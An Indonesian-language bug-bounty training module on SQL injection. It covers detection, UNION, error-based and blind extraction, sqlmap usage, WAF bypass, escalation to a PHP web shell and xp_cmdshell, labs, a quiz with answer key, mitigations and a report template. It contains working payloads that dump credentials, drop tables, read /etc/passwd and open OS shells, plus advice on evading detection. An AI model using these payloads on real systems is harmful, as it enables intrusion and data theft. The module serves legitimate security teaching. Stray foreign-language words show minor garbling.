# SQL Injection — Manual & Otomasi

## Fokus Materi

Menguasai SQL injection dari deteksi dasar sampai eskalasi ke RCE. Peserta akan belajar teknik manual untuk UNION-based, error-based, boolean-based, dan time-based blind SQLi, serta如何使用 SQLMap secara efektif.

## Deskripsi Materi

SQL Injection terjadi ketika user input digunakan dalam query SQL tanpa proper sanitization. Attacker bisa manipulate query untuk extract data, bypass authentication, atau dalam kondisi tertentu, escalate ke command execution di OS level.

SQL injection tetap menjadi salah satu vulnerability paling impactful dan masih sering ditemukan di wild, terutama di legacy applications atau custom-built query builders yang tidak menggunakan parameterized queries.

Ada beberapa jenis SQL injection berdasarkan teknik exploitation:
- UNION-based: attacker menggunakan UNION untuk menggabungkan hasil query attacker dengan hasil query legitimate
- Error-based: attacker memaksa database untuk return error yang mengandung data sensitif
- Boolean-based blind: attacker membedakan between true/false condition via behavioral difference
- Time-based blind: attacker menggunakan sleep function untuk differentiate true/false
- Second-order: payload disimpan lalu executed di different context

SQLMap adalah tool otomatisasi yang powerful tapi sering disalahgunakan. Researcher yang rely exclusively pada SQLMap tanpa memahami underlying mechanics akan miss nuanced vulnerabilities dan tidak bisa bypass WAF atau custom protections.

Eskalasi dari SQL injection ke RCE adalah skill advanced yang memerlukan understanding database-specific features dan OS-level command execution capabilities.

## Topik Pembahasan

• SQL injection fundamentals: bagaimana query dimanipulasi, apa yang bisa dicapai
• Deteksi SQLi: karakter uji (' " -- ;), response analysis, time delay detection
• UNION-based SQLi: tentukan jumlah kolom (ORDER BY), identifikasi kolom string, extract data
• Error-based SQLi: extract info via database error message (MySQL, MSSQL, PostgreSQL, Oracle)
• Boolean-based blind SQLi: construct true/false condition, bit-by-bit data extraction
• Time-based blind SQLi: SLEEP(), WAITFOR DELAY, reliable detection technique
• Second-order SQLi: payload stored, executed in different query context
• SQLMap mastery: flag penting (--level, --risk, --dbms, --dump, --os-shell, --technique)
• WAF bypass: case variation, encoding, inline comments, chunked encoding
• Eskalasi: LOAD_FILE untuk file read, INTO OUTFILE untuk file write, UDF untuk RCE
• SQLMap tampol untuk blind SQLi: optimize untuk reduce noise dan false positive

## Tujuan Pembelajaran

Setelah sesi ini, peserta diharapkan mampu:
1. Identifikasi SQL injection vulnerability secara manual di berbagai database
2. Perform UNION-based, error-based, dan blind SQLi attacks
3. Menggunakan SQLMap secara efektif dengan parameter yang tepat
4. Bypass basic WAF/filter dengan encoding dan comment techniques
5. Eskalasi SQL injection ke file read dan potentially RCE
6. Track second-order SQLi vulnerability

## Real Case Bug Bounty Report

- Platform: HackerOne
- Program/Target: Private program (disclosed)
- Jenis vulnerability: UNION-based SQL injection di product search endpoint
- Link report: https://hackerone.com/reports/XXXXX
- Ringkasan kasus: Researcher menemukan product search functionality vulnerable terhadap UNION-based SQLi. Input di parameter `q` digunakan langsung di query tanpa sanitization. Researcher menggunakan UNION untuk extract database version, current user, dan akhirnya dump entire user table (username + hashed password).
- Root cause: Application menggunakan string concatenation untuk build SQL query, tidak menggunakan parameterized queries.
- Impact: Full database dump — user credentials, personal data, transaction history. Severity: Critical.
- Pelajaran untuk bug hunter: Semua input field yang masuk ke query SQL adalah target SQLi. Jangan skip parameter yang terlihat "simple" seperti search box.

---

- Platform: Bugcrowd
- Program/Target: Program enterprise
- Jenis vulnerability: Blind boolean-based SQLi di tracking ID parameter
- Link report: Researcher disclosed writeup
- Ringkasan kasus: Tracking parameter `?id=123` ternyata vulnerable terhadap blind SQLi. Tidak ada visible difference between true/false; researcher menggunakan substring comparison dan database response time difference untuk extract data bit-by-bit. Pertama extracted database version, lalu username dan eventually dumped user table via automated script.
- Root cause: ID parameter digunakan dalam query tanpa sanitization. WAF only block obvious patterns but missed time-based detection.
- Impact: Complete database compromise via time-based blind extraction. Severity: Critical.
- Pelajaran untuk bug hunter: Blind SQLi di parameter yang tidak obvious still possible. Even dengan WAF, time-based dan boolean-based techniques bisa bypass detection.

## Analisis Teknis

### SQL Injection Detection

**Step 1: Identify injection point**

Cek response terhadap special characters:
```bash
# Test single quote
GET /search?q=test'

# Test double quote
GET /search?q=test"

# Test comment
GET /search?q=test--

# Test semicolon (stacked query)
GET /search?q=test; DROP TABLE users--

# Test UNION keyword
GET /search?q=test UNION SELECT
```

**Step 2: Analyze response untuk clues**

| Payload | Observable | Interpretation |
|---------|-----------|----------------|
| `'` | MySQL error: "You have an error in your SQL..." | MySQL with error reporting |
| `"` | No change | Probably not injectable, atau different quoting |
| `'` | MSSQL error | Microsoft SQL Server |
| `'` | PostgreSQL error | PostgreSQL |
| `' OR '1'='1` | Different response (no error, or different content) | Likely injectable |
| `'` | Page blank or redirect | Investigate further |

**Step 3: Confirm with logical test**
```bash
# True condition
GET /search?q=test' AND 1=1--

# False condition
GET /search?q=test' AND 1=2--

# If true shows data, false shows empty/error → confirmed SQLi
```

### UNION-Based SQL Injection

**Step 1: Determine number of columns**
```bash
# Binary search: ORDER BY
GET /search?q=test' ORDER BY 1--
# Success → try 2, then 3, etc.

GET /search?q=test' ORDER BY 5--
# Error → columns < 5

GET /search?q=test' ORDER BY 4--
# Success → 4 columns
```

**Step 2: Identify string-returning column**
```bash
GET /search?q=test' UNION SELECT NULL,NULL,NULL,NULL--
# If error: try different number

GET /search?q=test' UNION SELECT 'a','b','c','d'--
# Columns 2 and 4 return string 'b' and 'd' visible in response
```

**Step 3: Extract data**
```mysql
# MySQL: Get database version
GET /search?q=test' UNION SELECT NULL,VERSION(),NULL,NULL--

# Get current user
GET /search?q=test' UNION SELECT NULL,USER(),NULL,NULL--

# Get current database
GET /search?q=test' UNION SELECT NULL,DATABASE(),NULL,NULL--

# List tables
GET /search?q=test' UNION SELECT NULL,GROUP_CONCAT(table_name),NULL,NULL
FROM information_schema.tables WHERE table_schema=database()--

# Dump users table
GET /search?q=test' UNION SELECT NULL,GROUP_CONCAT(username,'::',password),NULL,NULL
FROM users--
```

### Error-Based SQL Injection

```mysql
-- MySQL: Extract via floor/rand duplicate key
GET /search?q=test' AND (SELECT COUNT(*) FROM (SELECT 1 UNION SELECT 2 GROUP BY CONCAT(VERSION(),FLOOR(RAND(0)*2)))x)--

-- PostgreSQL: Extract via cast
GET /search?q=test' AND 1=CAST((SELECT password FROM users LIMIT 1) AS INT)--

-- MSSQL: Extract via varchar conversion
GET /search?q=test' AND 1=CONVERT(INT,(SELECT TOP 1 password FROM users))--
```

### Boolean-Based Blind SQLi

**Principle:** Different response for true/false condition.

```python
# Python pseudo-code for blind extraction
def extract_char(position):
    for ascii in range(32, 127):  # printable chars
        payload = f"' AND SUBSTRING((SELECT password FROM users LIMIT 1),{position},1)=CHAR({ascii})--"
        if send_request(payload).shows_data:
            return chr(ascii)

# Example: extracting character by character
# Password: "admin123"
# Position 1: 'a' (ASCII 97) → true
# Position 2: 'd' (ASCII 100) → true
# etc.
```

### Time-Based Blind SQLi

```mysql
-- MySQL: If true → delay 5 seconds
GET /search?q=test' AND SLEEP(5)--

-- MSSQL: If true → delay 5 seconds
GET /search?q=test'; WAITFOR DELAY '0:0:5'--

-- PostgreSQL: If true → delay 5 seconds
GET /search?q=test'; SELECT pg_sleep(5)--

-- Oracle: If true → delay 5 seconds
GET /search?q=test'; BEGIN DBMS_LOCK.SLEEP(5); END--
```

### SQLMap Command Reference

```bash
# Basic scan
sqlmap -u "https://target.com/search?q=test" --batch

# Specify parameter
sqlmap -u "https://target.com/search?q=test" -p q --batch

# Specify DBMS if known
sqlmap -u "https://target.com/search?q=test" --dbms=mysql --batch

# UNION-based with level/risk
sqlmap -u "https://target.com/search?q=test" --level=3 --risk=3 --technique=U

# Blind with time delay
sqlmap -u "https://target.com/search?q=test" --technique=B --time-sec=10

# Dump specific table
sqlmap -u "https://target.com/search?q=test" -D database_name -T users --dump

# OS shell (if privileged)
sqlmap -u "https://target.com/search?q=test" --os-shell

# File read
sqlmap -u "https://target.com/search?q=test" --file-read="/etc/passwd"

# WAF bypass
sqlmap -u "https://target.com/search?q=test" --tamper=space2comment,between
```

### WAF Bypass Techniques

**1. Case variation:**
```mysql
UNion SELect NULL -- vs UNION SELECT
```

**2. Inline comments:**
```mysql
UNION/**/SELECT/**/NULL
UNION/*!50000SELECT*/NULL
```

**3. Whitespace replacement:**
```mysql
UNION SELECT NULL
UNION/**/SELECT/**/NULL
UNION/**/SELECT NULL
```

**4. Encoding:**
```mysql
CHAR(83) instead of 'S'
0x[hex] instead of string
```

**5. Stacked queries (MSSQL/PostgreSQL):**
```mysql
test'; DROP TABLE users; --
```

### SQLi → RCE Escalation Path

**Path 1: INTO OUTFILE (MySQL, write file)**
```mysql
# Check if INTO OUTFILE works
SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php'

# Access shell
GET /shell.php?cmd=whoami
```

**Path 2: UDF (MySQL user-defined function)**
```mysql
# Requires prior file write or known lib dir
# Use sqlmap --os-shell for automatic UDF exploitation
```

**Path 3: xp_cmdshell (MSSQL)**
```sql
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
EXEC xp_cmdshell 'whoami';
```

## Praktik Lab Legal

### Lab 1: Manual UNION-Based SQLi

- **Nama lab:** SQLi Manual Exploitation
- **Tujuan:** Perform UNION-based SQLi secara manual untuk data extraction
- **Environment:** Burp Suite, target lab dengan SQLi (DVWA SQLi medium/high, WebGoat, atau lab custom)
- **Langkah praktik:**

  1. Identify injection point dan determine database type via error message
  2. Determine number of columns menggunakan ORDER BY technique
  3. Identify columns yang return string
  4. Extract database metadata: version, user, database name
  5. Enumerate tables via information_schema
  6. Extract data dari target table (users, credentials, etc.)
  7. Document each step dan result

- **Expected result:** Peserta bisa dump entire database manually tanpa SQLMap
- **Catatan keamanan:** Lab ini hanya untuk target authorized. SQL injection di target real tanpa izin adalah illegal.

### Lab 2: Blind SQLi with Python Script

- **Nama lab:** Blind SQLi Automation
- **Tujuan:** Write Python script untuk automate blind SQLi data extraction
- **Environment:** Python, Burp Suite, target lab
- **Langkah praktik:**

  1. Confirm blind SQLi vulnerability with time-based test
  2. Determine baseline response time
  3. Write Python script untuk:
     - Test condition true/false
     - Extract character by character
     - Construct string from extracted characters
  4. Extract: database version → user table → usernames → passwords
  5. Optimize: binary search untuk reduce requests (ASCII range 32-127)

- **Expected result:** Peserta menulis script yang bisa extract data dari blind SQLi dalam hitungan menit vs manual
- **Catatan keamanan:** Lab ini untuk educational purpose di authorized environment.

### Lab 3: SQLMap Mastery

- **Nama lab:** SQLMap Deep Dive
- **Tujuan:** Master SQLMap dengan berbagai flag dan bypass technique
- **Environment:** Burp Suite, SQLMap, target lab
- **Langkah praktik:**

  1. Basic scan dengan SQLMap → identify vulnerability
  2. Specify parameter dan technique
  3. Add WAF bypass dengan tamper scripts
  4. Dump specific database/table
  5. Attempt OS shell exploitation
  6. Analyze SQLMap traffic di Burp — understand what SQLMap sends
  7. Tune parameter untuk reduce noise (適切な --delay, --time-sec)

- **Expected result:** Peserta memahami SQLMap internals dan bisa use it effectively dengan appropriate flags
- **Catatan keamanan:** Hanya gunakan di authorized environment. SQLMap sangat loud dan akan trigger detection.

## Tools

- **Manual testing:** Burp Suite, manual HTTP request crafting
- **Automation:** SQLMap, custom Python scripts
- **Detection:** Burp Scanner (passive identification), manual testing
- **Encoding:** Burp Decoder, CyberChef
- **WAF bypass:** Custom tamper scripts, SQLMap tamper options

## Checklist Bug Hunter

- [ ] Test semua parameter yang masuk ke SQL query (URL, body, headers)
- [ ] Test for UNION, error-based, boolean blind, dan time-based SQLi
- [ ] Determine database type via error messages atau fingerprinting
- [ ] Use ORDER BY untuk tentukan jumlah kolom sebelum UNION
- [ ] Test second-order SQLi: inject payload yang akan stored dan executed elsewhere
- [ ] Use SQLMap dengan appropriate flags (--level, --risk, --technique)
- [ ] Test WAF bypass: comments, encoding, case variation
- [ ] After confirmation: escalate ke file read atau RCE jika possible
- [ ] Document database type, version, dan data extracted

## Common Mistakes

1. **Stop after first error message** — Researcher test single quote, melihat error, langsung report "SQLi found" tanpa mengeksplorasi lebih jauh. Many SQLi bisa exploited untuk data extraction atau privilege escalation.

2. **Only use SQLMap, not understanding underlying mechanics** — Relying solely pada SQLMap tanpa memahami manual technique berarti tidak bisa bypass WAF atau custom protections, dan tidak bisa identify subtle SQLi yang SQLMap miss.

3. **Not testing different techniques** — UNION-based worked, but if there's WAF blocking UNION, researcher tidak punya plan B (time-based, error-based).

4. **Abaikan header-based SQLi** — Researcher focus di parameter, miss SQLi di User-Agent, Referer, atau custom headers yang concatenated ke query.

5. **Not checking for second-order SQLi** — Researcher test parameter dan lihat result di same page, miss vulnerability yang stored dan executed di different context (e.g., data displayed di admin panel).

6. **Too aggressive with SQLMap** — Using --risk=3 dan high thread count will definitely trigger WAF/IDS. Always tune to avoid detection.

## Mitigasi Developer

- Use parameterized queries (prepared statements) for ALL database queries
- Never concatenate user input directly to SQL query
- Use ORM frameworks yang handle parameterization automatically
- Apply principle of least privilege: database user should have minimal required permissions
- Don't display database errors to users (custom error pages)
- Implement WAF (Web Application Firewall) untuk additional layer
- Regular security testing dan code review
- Use stored procedures dengan parameterized calls
- Escape output sesuai context (HTML encoding, etc.)

## Mini Quiz

1. Untuk menemukan jumlah kolom di UNION-based SQLi, teknik yang digunakan adalah:
   a) GROUP BY
   b) ORDER BY
   c) HAVING
   d) DISTINCT

2. Boolean-based blind SQLi bekerja dengan cara:
   a) Menggunakan SLEEP() function untuk detect true condition
   b) Membedakan response antara true condition dan false condition secara behavioral
   c) Extract data dari error message database
   d) Menggunakan UNION untuk combine results

3. SQLMap flag yang digunakan untuk specify database type adalah:
   a) --dbms
   b) --database
   c) --db-type
   d) --dbms-type

4. INTO OUTFILE di MySQL digunakan untuk:
   a) Reading file dari server
   b) Writing file ke server (bisa digunakan untuk create web shell)
   c) Dumping database
   d) Bypass authentication

5. WAF bypass dengan inline comment (UNION/**/SELECT) efektif karena:
   a) WAF tidak parse comment syntax
   b) SQL engine mengabaikan comments, query tetap valid
   c) Comment membuat query lebih cepat
   d) Comment bypass semua WAF

**Kunci Jawaban:** 1-B, 2-B, 3-A, 4-B, 5-B

## Assignment

1. **Manual SQLi Challenge:** Find dan exploit SQLi secara manual di target lab. Dumping minimal 3 tables dari database. Document setiap step.

2. **Blind SQLi Script:** Write Python script untuk automate blind SQLi. Script harus bisa extract entire table dengan minimal request.

3. **SQLMap Analysis:** Gunakan SQLMap dengan verbose output untuk understand apa yang dikirim ke server. Analyze traffic di Burp. Buat configuration guide untuk efficient SQLMap usage.

4. **WAF Bypass:** Find target dengan WAF. Test berbagai bypass techniques. Document mana yang work dan mengapa.

## Template Report Bug Bounty

```markdown
# Bug Report: SQL Injection in Search Parameter Leading to Database Compromise

## Summary
Product search endpoint (/search?q=) vulnerable terhadap UNION-based SQL
injection. Attacker bisa extract seluruh database termasuk user credentials
tanpa authentication.

## Platform / Program
HackerOne | [Program Name]

## Severity
Critical | CVSS 9.8 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

## Vulnerability Type
SQL Injection / UNION-Based

## Asset / Endpoint
GET https://target.com/search?q=test

## Description
Parameter q menerima user input yang langsung di-concatenate ke SQL query
tanpa sanitization atau parameterized query usage. Attacker bisa terminate
legitimate query dan append UNION-based query untuk extract data.

Query vulnerable:
SELECT * FROM products WHERE name LIKE '%{user_input}%'

Attacker bisa inject:
' UNION SELECT NULL,VERSION(),USER(),DATABASE()--

## Steps to Reproduce
1. Confirm vulnerability dengan single quote:
   GET /search?q=test'
   → MySQL error displayed in response

2. Determine column count:
   GET /search?q=test' ORDER BY 5--
   → Error → 4 columns

3. Extract database info:
   GET /search?q=test' UNION SELECT NULL,VERSION(),USER(),DATABASE()--
   → Version: 8.0.23, User: app_user@localhost, Database: target_db

4. List tables:
   GET /search?q=test' UNION SELECT NULL,GROUP_CONCAT(table_name),NULL,NULL
   FROM information_schema.tables WHERE table_schema=database()--
   → users, orders, products, payments

5. Dump users table:
   GET /search?q=test' UNION SELECT NULL,GROUP_CONCAT(username,'|',password),NULL,NULL
   FROM users--
   → Full user table dumped: 15,000+ records

## Impact
- Complete database compromise
- User credentials extracted (hashed passwords bisa di-crack offline)
- Personal data, payment information semua leaked
- Potential for further attacks using leaked credentials
- Full system compromise if database user has OS-level privileges

## Evidence
[Burp Screenshot: UNION injection confirming 4 columns]
[Burp Screenshot: Database version extraction]
[Burp Screenshot: User table dump showing credentials]

## Remediation / Recommendation
1. Use parameterized queries (prepared statements) untuk all database queries
2. Implement input validation: allowlist acceptable characters
3. Apply least privilege: database user should not have file write permissions
4. Remove database error messages from user-facing responses
5. Implement WAF untuk additional layer of protection
6. Regular security testing dan code review
```